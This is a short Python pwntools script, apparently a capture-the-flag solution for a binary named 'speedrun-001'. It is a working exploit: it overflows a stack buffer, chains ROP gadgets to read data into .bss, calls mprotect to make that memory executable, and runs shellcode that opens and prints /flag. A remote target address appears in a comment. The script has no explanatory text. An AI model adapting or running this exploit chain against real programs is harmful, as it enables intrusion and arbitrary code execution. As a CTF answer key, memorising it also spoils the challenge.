from pwn import *
from struct import pack

puts=0x000000000410390
read=0x0000000004498A0
rax=0x0000000000415664
rdi=0x0000000000400686
bss=0x006b6000+0x3000
rsi=0x00000000004101f3
rdx=0x00000000004498b5
sys=0x0000000000474e65
setvbuf=0x000000000410590
push_rdi=0x00000000004236a5
push_rax_push_rsp=0x0000000000450ae3
context.log_level='debug'
context.arch="amd64"
p=process('./speedrun-001')
#p=remote("52.53.247.202",31337)
gdb.attach(p,'b * 0x000000000400B8B')

#p64(rdi)+p64(0x00000000006b9140)+p64(rsi)+p64(0)+p64(rdx)+p64(2)+p64(setvbuf)
payload='\x00'*0x408+p64(rdi)+p64(0)+p64(rsi)+p64(bss)+p64(rdx)+p64(0x100)+p64(read)
payload+=p64(rax)+p64(0xa)+p64(rdi)+p64(bss)+p64(rsi)+p64(0x1000)+p64(rdx)+p64(7)+p64(sys)+p64(bss)
#payload="\x00"*0x408+p64(rdi)+p64(0x006b6000+0x3000)+p64(puts)


p.sendafter("words?\n",payload.ljust(0x700,'\x00'))

sh=asm(shellcraft.open("/flag"))
rw='''
mov rdi,rax
mov rsi,0x006b9300
mov rdx,0x100
mov al,0
syscall
mov rdi,1
mov rsi,0x006b9300
mov rdx,0x20
mov al,1
syscall
'''
p.sendlineafter(" say: \n",sh+asm(rw))
#p.sendline("cat flag")
p.interactive()



	

